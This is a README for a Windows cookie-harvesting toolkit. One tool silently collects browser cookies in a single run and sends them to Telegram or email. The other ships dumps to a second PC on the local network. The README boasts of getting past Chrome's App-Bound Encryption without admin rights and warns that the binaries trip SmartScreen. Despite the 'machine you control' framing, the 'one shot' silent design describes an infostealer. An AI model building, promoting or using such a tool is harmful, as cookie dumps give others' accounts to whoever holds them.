# cookie-kit

Two independent tools for pulling cookies off a Windows machine you control.

| Folder | Use it when |
|---|---|
| `cookiedrop/` | You get **one** shot on a machine and want the data pushed to your phone/email. No setup, no network pairing. |
| `cookiesync/` | Two machines on the same LAN and you want repeatable, scheduled, receiver-side storage. |

Chromium browsers in both tools are read through the DevTools Protocol, so Chrome 127+
App-Bound Encryption (`v20`) is a non-issue and nothing is decrypted locally. Firefox is
handled separately because it does not encrypt cookie values at all. Neither tool needs
admin rights.

Pick one. They share no code.

## cookiedrop

Silent one-click harvest pushed to Telegram and/or Brevo email. See `cookiedrop/README.md`.
Fastest path: unzip, fill `config.json`, double-click `RUN.bat` (or build `CookieDrop.exe`).

## cookiesync

One-line sender, always-on receiver on the second PC. See `cookiesync/README.md`.

## Shared caveats

- Windows cannot execute anything from a zip. Every route needs one double-click.
- Cookies are bearer credentials. A dump is account takeover. Delete old dumps.
- Unsigned binaries trip SmartScreen once.

## License

MIT, see `LICENSE`.